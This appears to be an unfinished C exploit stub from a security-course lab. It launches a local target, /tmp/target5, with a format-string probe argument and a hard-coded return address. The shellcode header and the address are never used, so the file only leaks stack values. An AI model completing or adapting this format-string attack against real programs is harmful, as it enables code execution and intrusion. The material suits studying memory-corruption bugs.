#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
	// By inspection, we find the EIP address to be:
	int EIP_ADDRESS = 0xbffffe70;
	char sploitstring[] = "%08x %08x %08x %08x %08x\n";
	char *args[] = { TARGET, sploitstring, NULL };
	char *env[] = { NULL };

	execve(TARGET, args, env);
	fprintf(stderr, "execve failed.\n");

	return 0;
}
